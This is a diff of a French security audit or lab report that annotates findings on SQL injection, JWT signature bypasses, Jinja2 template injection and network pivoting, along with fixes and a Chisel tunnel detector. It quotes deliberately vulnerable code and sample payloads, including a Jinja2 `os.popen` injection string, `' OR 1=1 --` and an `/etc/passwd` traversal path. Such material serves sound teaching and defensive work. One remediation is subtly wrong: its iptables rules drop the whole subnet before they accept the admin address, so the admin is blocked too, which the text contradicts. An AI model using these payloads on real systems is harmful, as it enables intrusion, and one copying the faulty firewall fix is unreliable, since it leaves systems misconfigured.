 **Explication :** Avec les requêtes paramétrées, la valeur `filter_val` est transmise **séparément** du plan de requête. Le SGBD la traite comme une donnée, pas comme du code SQL. Même si la valeur contient `' OR 1=1 --`, elle sera échappée automatiquement.
 
 #### Remédiation avancée
 
 ```python
-# Solution 1 : ORM (SQLAlchemy)
+# Solution 1 : ORM (SQLAlchemy) — abstraction de la couche SQL
 from flask_sqlalchemy import SQLAlchemy
 db = SQLAlchemy()
 
@@ -1305,22 +1939,34 @@ class Transaction(db.Model):
 @jwt_required
 def api_transactions():
     filter_val = request.args.get('filter', '')
+    # L'ORM génère automatiquement des requêtes paramétrées (safe par construction)
     transaction = Transaction.query.filter_by(id=filter_val).first()
     return jsonify(transaction.to_dict() if transaction else [])
 
-# Solution 2 : Validation stricte du type
+# Solution 2 : Validation stricte du type + requête paramétrée
 @app.route('/api/transactions')
 @jwt_required
 def api_transactions():
     try:
+        # Force le cast en int : si ce n'est pas un entier, ValueError est levé
         filter_val = int(request.args.get('filter', 0))
     except ValueError:
         return jsonify({'error': 'ID invalide'}), 400
-    # Requête paramétrée
+    # Requête paramétrée (safe contre la SQLi même si la validation échouait)
     query = "SELECT * FROM transactions WHERE id = ?"
     results = query_db(query, (filter_val,))
     return jsonify(results)
 ```
+
+**Explication des solutions avancées :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| **Solution 1 — ORM** | Les requêtes SQL sont générées par l'ORM avec paramétrisation automatique (SQLAlchemy, Eloquent, etc.) |
+| `Transaction.query.filter_by(id=filter_val)` | L'ORM construit une requête paramétrée : le SGBD reçoit la valeur comme paramètre, pas comme du SQL |
+| **Solution 2 — Validation stricte** | `int(filter_val)` : si la valeur n'est pas un entier, la requête est refusée avant même d'atteindre la base |
+| `int(request.args.get('filter', 0))` | Force le type (cast) + valeur par défaut = protection supplémentaire |
+| Principe de défense en profondeur | Combiner validation de type + requêtes paramétrées + moindre privilège BDD |
 
 #### Références
 
@@ -1338,21 +1984,30 @@ def api_transactions():
 
 **Cause racine multiple :**
 
-**1. None Algorithm (T1134.003) :**
+**1. None Algorithm (T1548) — Accepte l'algorithme 'none' sans vérification :**
 
 ```python
 # Code vulnérable — app.py:252
-header = jwt.get_unverified_header(token)
-if header.get('alg') == 'none':
-    # ⚠️ NE JAMAIS FAIRE CELA
+header = jwt.get_unverified_header(token)     # Lit le header SANS vérifier la signature (dangereux)
+if header.get('alg') == 'none':                # Si l'algorithme est 'none'...
+    # ⚠️ NE JAMAIS FAIRE CELA — désactive TOUTE vérification de signature
     return jwt.decode(token, options={"verify_signature": False})
 ```
 
-**2. HMAC/RSA Confusion (T1134.003) :**
+**Explication — None Algorithm :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `jwt.get_unverified_header(token)` | Récupère le header du JWT sans vérifier la signature (le header est en clair, modifiable par l'attaquant) |
+| `header.get('alg') == 'none'` | Vérifie si l'algorithme déclaré est `'none'` (aucune signature) |
+| `options={"verify_signature": False}` | **Faille** : désactive la vérification cryptographique — le JWT est accepté sans signature valide |
+| Attaque | L'attaquant met `alg: none` dans le header, modifie le payload (ex: `"role": "admin"`) et ne signe pas — le serveur accepte le token |
+
+**2. HMAC/RSA Confusion (T1548) — Utilise la clé publique RSA comme clé HMAC :**
 
 ```python
 # Code vulnérable — app.py:271
-RSA_PUBLIC_KEY = open("public.pem").read()
+RSA_PUBLIC_KEY = open("public.pem").read()  # La clé publique RSA est accessible (via /api/jwt-info)
 
 def verify_jwt(token):
     header = jwt.get_unverified_header(token)
@@ -1360,51 +2015,72 @@ def verify_jwt(token):
         try:
             return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])
         except:
-            # ⚠️ Fallback dangereux : accepte HS256 avec la clé PUBLIQUE
+            # ⚠️ Fallback DANGEREUX : si RS256 échoue, tente HS256 avec la même clé PUBLIQUE
+            # Le problème : la clé publique est connue de tous, donc l'attaquant peut signer en HMAC avec elle
             try:
                 return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])
             except:
                 pass
 ```
 
-**3. Kid Injection (T1134.003) :**
+**Explication — HMAC/RSA Confusion :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `open("public.pem").read()` | Charge la clé publique RSA (accessible via l'endpoint `/api/jwt-info`) |
+| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])` | Vérification normale avec la clé publique (RS256 = asymétrique) |
+| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])` | **Faille** : tente HS256 (symétrique) avec la **clé publique** comme secret HMAC |
+| Attaque | L'attaquant récupère la clé publique via `/api/jwt-info`, puis forge un JWT avec `alg: HS256` signé avec la clé publique — le serveur vérifie avec la même clé publique et accepte le token |
+
+**3. Kid Injection (T1548) — Path traversal dans le paramètre kid :**
 
 ```python
 # Code vulnérable — app.py:258
-kid = header.get('kid', '')
-if '../' in kid or '/dev/' in kid:
-    if 'null' in kid:
-        # ⚠️ Utilise une chaîne vide comme clé secrète
+kid = header.get('kid', '')             # Le paramètre 'kid' (Key ID) est contrôlé par l'attaquant
+if '../' in kid or '/dev/' in kid:       # Détection imparfaite de path traversal
+    if 'null' in kid:                    # Si le kid contient 'null'...
+        # ⚠️ Utilise une chaîne VIDE comme clé secrète pour vérifier le JWT
+        # L'attaquant peut signer son token avec une chaîne vide
         return jwt.decode(token, '', algorithms=['HS256'])
 ```
+
+**Explication — Kid Injection :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `header.get('kid', '')` | Récupère le paramètre `kid` du header (censé indiquer quelle clé utiliser) — contrôlé par l'attaquant |
+| `if '../' in kid or '/dev/' in kid` | Filtre imparfait : détecte les tentatives de path traversal mais la logique est défaillante |
+| `jwt.decode(token, '', algorithms=['HS256'])` | **Faille** : utilise une chaîne vide comme secret HMAC — l'attaquant peut signer avec une chaîne vide |
+| Attaque | L'attaquant met `kid: ...null...` dans le header, signe le token avec une clé vide, et le serveur valide avec une clé vide |
 
 #### Solutions de correction
 
 ```python
 # Solution complète — verification_jwt.py
+# Met en œuvre les bonnes pratiques JWT : liste blanche d'algorithmes, refus de 'none', validation du kid
 
 import jwt
 from jwt import PyJWTError
 
-# Clés séparées pour HMAC et RSA
+# Clés séparées pour HMAC et RSA (ne JAMAIS utiliser la même clé pour les deux)
 HMAC_SECRET = os.environ.get('JWT_HMAC_SECRET', 'une-chaîne-aléatoire-très-longue-128-caractères-minimum')
 RSA_PRIVATE_KEY = open("/etc/ssl/jwt_private.pem").read()
 RSA_PUBLIC_KEY = open("/etc/ssl/jwt_public.pem").read()
 
-# Liste blanche des algorithmes acceptés
-ALLOWED_ALGORITHMS = ['RS256']  # Un seul algorithme autorisé !
+# Liste blanche des algorithmes acceptés (un seul algorithme autorisé)
+ALLOWED_ALGORITHMS = ['RS256']
 
-# Liste blanche des kid valides
+# Liste blanche des kid valides (empêche l'injection de chemin)
 ALLOWED_KIDS = ['key1', 'key2', 'key3']
 
 def verify_jwt_secure(token):
     """Vérification sécurisée d'un JWT."""
     try:
-        # 1. Récupérer le header SANS faire confiance
+        # 1. Récupérer le header SANS faire confiance (mais nécessaire pour connaître l'algo déclaré)
         header = jwt.get_unverified_header(token)
         alg = header.get('alg', '')
 
-        # 2. Refuser 'none' explicitement
+        # 2. Refuser 'none' explicitement (avant toute autre vérification)
         if alg == 'none':
             raise jwt.InvalidAlgorithmError("Algorithme 'none' refusé")
 
@@ -1412,12 +2088,12 @@ def verify_jwt_secure(token):
         if alg not in ALLOWED_ALGORITHMS:
             raise jwt.InvalidAlgorithmError(f"Algorithme {alg} non autorisé")
 
-        # 4. Vérifier le kid (si présent)
+        # 4. Vérifier le kid (si présent) contre une liste blanche — pas de path traversal possible
         kid = header.get('kid', '')
         if kid and kid not in ALLOWED_KIDS:
             raise jwt.InvalidTokenError(f"kid {kid} non reconnu")
 
-        # 5. Vérifier la signature avec la clé appropriée
+        # 5. Vérifier la signature avec la clé appropriée (un seul chemin possible)
         if alg == 'RS256':
             return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])
 
@@ -1426,6 +2102,18 @@ def verify_jwt_secure(token):
 
     return None
 ```
+
+**Explication du code corrigé :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `ALLOWED_ALGORITHMS = ['RS256']` | Liste blanche : un seul algorithme accepté, tout autre (dont `none` et `HS256`) est rejeté |
+| `if alg == 'none'` | Refus explicite de l'algorithme `none` (protection en profondeur) |
+| `ALLOWED_KIDS = ['key1', 'key2', 'key3']` | Liste blanche des `kid` valides : empêche l'injection de chemins arbitraires |
+| `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])` | Décodage avec clé RSA publique et algorithme RS256 uniquement |
+| `HMAC_SECRET` et `RSA_PRIVATE_KEY` | Clés séparées pour les différents usages (pas de confusion possible) |
+| Principe de défense en profondeur | Combinaison de (1) liste blanche d'algos, (2) validation du kid, (3) refus de 'none', (4) clés séparées |
+| `PyJWTError` | Capture toutes les erreurs JWT (signature invalide, token expiré, etc.) en une seule exception |
 
 #### Références
 
@@ -1451,11 +2139,22 @@ from flask import render_template_string
 def admin_templates():
     template = request.form.get('template', '')
 
-    # ⚠️ render_template_string interprète le contenu comme un template Jinja2
-    # Ceci permet l'exécution de code Python arbitraire via __globals__
+    # ⚠️ render_template_string interprète la chaîne comme un template Jinja2 complet
+    # L'attaquant peut injecter : {{ cycler.__init__.__globals__.os.popen('cmd').read() }}
+    # Le moteur Jinja2 exécute le code Python arbitraire sans aucune restriction
     rendered = render_template_string(template)
     return rendered
 ```
+
+**Explication du code vulnérable :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `render_template_string(template)` | **Faille** : interprète la chaîne utilisateur comme un template Jinja2 — exécution de code arbitraire |
+| `request.form.get('template', '')` | Récupère le template depuis la requête POST sans filtrage |
+| `{{ }}` | Délimiteurs Jinja2 : tout ce qui se trouve entre eux est exécuté par le moteur de template |
+| Accès aux globals | `cycler.__init__.__globals__.os.popen()` : chaîne d'accès aux objets Python internes |
+| Impact | Exécution de commandes système (RCE), exfiltration de données, reverse shell |
 
 **Cause racine :** `render_template_string()` prend une chaîne et l'interprète comme un template Jinja2 complet. Si l'utilisateur contrôle cette chaîne, il peut injecter des expressions `{{ }}` qui accèdent aux objets Python internes (`__class__`, `__mro__`, `__subclasses__`, `__globals__`).
 
@@ -1483,28 +2182,52 @@ def admin_templates():
     template_name = request.form.get('template', 'default.html')
     data = request.form.get('data', '')
 
-    # ✅ Utiliser un template fixe et passer les données comme variables
+    # ✅ Utiliser un template fixe (fichier .html) et passer les données comme variables
+    # La saisie utilisateur est disponible via {{ user_data }} dans le fichier template
+    # render_template() charge le fichier — la variable data n'est jamais interprétée comme du code
     return render_template(
-        f"admin/{template_name}.html",  # Attention : valider template_name !
+        f"admin/{template_name}.html",
         user_data=data
     )
 ```
 
+**Explication — Solution 1 :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `render_template("admin/{name}.html", user_data=data)` | Charge un fichier template fixe ; `data` est passé comme **variable** et non comme **code** |
+| `{{ user_data }}` | Dans le fichier template, cette syntaxe affiche la valeur sans l'interpréter comme du code |
+| Principe | Séparation stricte entre le code du template (fichier) et les données utilisateur (variables) |
+| Attention | `template_name` doit être validé (éviter le path traversal : `../../../etc/passwd`) |
+
 ```python
-# Solution 2 : Sandbox Jinja2
+# Solution 2 : Sandbox Jinja2 — environnement restreint
 from jinja2.sandbox import SandboxedEnvironment
 
 env = SandboxedEnvironment()
-# Les objets dangereux (__class__, __globals__, etc.) sont bloqués
+# Le SandboxedEnvironment bloque automatiquement l'accès aux objets dangereux :
+#   - __class__, __base__, __subclasses__ (remontée de classes)
+#   - __globals__, __builtins__ (accès aux modules Python)
+#   - os, subprocess, eval, exec (exécution de code)
 
 template = env.from_string(user_input)
 result = template.render()
 ```
 
+**Explication — Solution 2 (Sandbox) :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `SandboxedEnvironment()` | Environnement Jinja2 sécurisé qui bloque les attributs dangereux (`__class__`, `__globals__`, etc.) |
+| `env.from_string(user_input)` | Crée un template à partir de la chaîne utilisateur DANS le sandbox |
+| Limitation | Un sandbox n'est pas infaillible — des failles de sandbox escaping existent (CVE historiques) |
+| Recommandation | Utiliser le sandbox EN PLUS d'un template fixe, pas comme seule protection |
+
 ```python
-# Solution 3 : Validation stricte avec liste blanche
+# Solution 3 : Validation stricte avec liste blanche (caractères autorisés)
 import re
 
+# Regex qui n'autorise que les caractères "sûrs" (lettres, chiffres, espaces, ponctuation simple)
 ALLOWED_PATTERN = re.compile(r'^[\w\s\.\,\;\:\!\?\%\€\-\(\)\[\]]+$')
 
 @app.route('/admin/templates', methods=['POST'])
@@ -1513,17 +2236,27 @@ ALLOWED_PATTERN = re.compile(r'^[\w\s\.\,\;\:\!\?\%\€\-\(\)\[\]]+$')
 def admin_templates():
     template = request.form.get('template', '')
 
-    # ✅ Rejeter tout ce qui ressemble à une expression Jinja2
+    # ✅ Rejeter tout ce qui ressemble à une expression Jinja2 (délimiteurs)
     if '{{' in template or '{%' in template:
         return jsonify({'error': 'Syntaxe template non autorisée'}), 400
 
-    # ✅ Validation stricte du contenu
+    # ✅ Validation stricte du contenu via la regex (whitelist)
     if not ALLOWED_PATTERN.match(template):
         return jsonify({'error': 'Caractères non autorisés'}), 400
 
-    # Traitement sécurisé...
+    # ✅ Utilisation d'un template fixe (pas de render_template_string)
     return render_template("preview.html", content=template)
 ```
+
+**Explication — Solution 3 (Validation) :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `r'^[\w\s\.\,\;\:\!\?\%\€\-\(\)\[\]]+$'` | Regex en liste blanche : seuls ces caractères sont autorisés (pas de `{}`, `<>`, `_` pour les accès Python) |
+| `if '{{' in template or '{%' in template` | Rejette les délimiteurs Jinja2 `{{ }}` (expression) et `{% %}` (bloc) |
+| `render_template("preview.html", content=template)` | Template fixe avec la saisie comme variable (safe par conception) |
+| Principe de défense en profondeur | Combinaison de (1) détection de syntaxe, (2) regex whitelist, (3) template fixe — 3 couches de sécurité |
+| Limitation | La regex peut être trop restrictive pour certains cas d'usage légitimes |
 
 #### Références
 
@@ -1549,36 +2282,66 @@ def admin_templates():
 #### Comment corriger
 
 ```bash
-# Solution 1 : Firewall interne (iptables)
-# Sur le serveur interne (10.0.0.10)
-iptables -A INPUT -s 10.0.0.0/24 -p tcp --dport 8081 -j DROP  # Bloque tout
-iptables -A INPUT -s 10.0.0.100 -p tcp --dport 8081 -j ACCEPT  # Autorise uniquement l'admin
+# Solution 1 : Firewall interne (iptables) sur le serveur interne (10.0.0.10)
+# Bloquer TOUT le trafic entrant vers le port 8081 depuis le sous-réseau 10.0.0.0/24
+iptables -A INPUT -s 10.0.0.0/24 -p tcp --dport 8081 -j DROP
+# Autoriser UNIQUEMENT l'adresse IP de l'administrateur (10.0.0.100)
+iptables -A INPUT -s 10.0.0.100 -p tcp --dport 8081 -j ACCEPT
 
-# Solution 2 : Firewall sur le serveur web (10.0.0.5)
-iptables -A OUTPUT -d 10.0.0.10 -p tcp --dport 8081 -j DROP  # Bloque les connexions sortantes
-iptables -A OUTPUT -d 10.0.0.10 -p tcp --dport 25 -j DROP     # Vers SMTP interne
+# Solution 2 : Firewall sur le serveur web compromis (10.0.0.5)
+# Bloquer les connexions SORTANTES depuis le serveur web vers le serveur interne
+# Empêche le pivoting : même si le serveur web est compromis, il ne peut pas atteindre le serveur interne
+iptables -A OUTPUT -d 10.0.0.10 -p tcp --dport 8081 -j DROP  # Bloque HTTP interne
+iptables -A OUTPUT -d 10.0.0.10 -p tcp --dport 25 -j DROP     # Bloque SMTP interne
 ```
 
+**Explication des règles iptables :**
+
+| Règle iptables | Rôle/Explication |
+|----------------|------------------|
+| `-A INPUT -s 10.0.0.0/24 -p tcp --dport 8081 -j DROP` | Bloque tout le trafic entrant sur le port 8081 depuis le réseau interne |
+| `-A INPUT -s 10.0.0.100 -p tcp --dport 8081 -j ACCEPT` | Autorise uniquement l'admin (10.0.0.100) à accéder au port 8081 |
+| `-A OUTPUT -d 10.0.0.10 -p tcp --dport 8081 -j DROP` | Empêche le serveur web compromis d'initier des connexions vers le serveur interne |
+| `-A OUTPUT -d 10.0.0.10 -p tcp --dport 25 -j DROP` | Bloque aussi les connexions SMTP sortantes |
+| `-A` | Ajoute une règle à la fin de la chaîne (append) |
+| `-s`/`-d` | Source/destination IP (/CIDR) |
+| `-j DROP` | Action : rejeter le paquet (peut aussi être `REJECT` avec message d'erreur) |
+| Principe de segmentation | **Zoning réseau** : le serveur web (DMZ) ne doit pas pouvoir contacter le serveur interne (zone d'administration) |
+
 ```python
-# Solution 3 : Détection des tunnels (code applicatif)
+# Solution 3 : Détection des tunnels (code applicatif — monitoring des connexions)
 import subprocess
 import re
 
 def detect_tunnels():
-    """Détecte les connexions sortantes inhabituelles."""
+    """Détecte les connexions sortantes inhabituelles sur le serveur."""
+    # ss -tpn : affiche les connexions TCP (-t) avec les processus (-p) et numériquement (-n)
     result = subprocess.run(['ss', '-tpn'], capture_output=True, text=True)
     connections = result.stdout
 
-    # Détecter Chisel (SOCKS5)
-    if 'socks5' in connections.lower() or '1080' in connections:
+    # Détecter Chisel (proxy SOCKS5 — port par défaut 1080 ou processus nommé chisel)
+    if 'socks5' in connections.lower() or '1080' in connections or 'chisel' in connections.lower():
         alert("Tunnel SOCKS5 détecté !")
 
-    # Détecter les connexions sortantes vers IP non autorisées
+    # Détecter les connexions sortantes vers des IP du réseau interne non autorisées
     for match in re.finditer(r'10\.0\.0\.\d+:\d+', connections):
-        ip_port = match.group()
+        ip_port = match.group()  # ex: "10.0.0.10:8081"
         if not is_authorized(ip_port):
             alert(f"Connexion non autorisée : {ip_port}")
 ```
+
+**Explication du code de détection :**
+
+| Élément | Rôle/Explication |
+|---------|------------------|
+| `subprocess.run(['ss', '-tpn'], capture_output=True, text=True)` | Exécute `ss -tpn` pour lister les connexions TCP actives avec leurs processus |
+| `ss -tpn` | `-t` : TCP, `-p` : affiche le PID/nom du processus, `-n` : pas de résolution DNS |
+| `'socks5' in connections.lower()` | Détecte la présence d'un proxy SOCKS5 actif (Chisel) |
+| `'1080' in connections` | Port par défaut de Chisel (SOCKS5) |
+| `'chisel' in connections.lower()` | Détection par nom de processus |
+| `re.finditer(r'10\.0\.0\.\d+:\d+', connections)` | Cherche toutes les connexions vers le réseau interne 10.0.0.0/24 (pivoting) |
+| `is_authorized(ip_port)` | Fonction de validation : vérifie si la connexion est légitime (ex: admin) ou suspecte (attaquant) |
+| Principe de détection | Monitoring réseau en temps réel pour identifier les comportements anormaux (connexions vers l'interne, tunnels) |
 
 #### Références
 
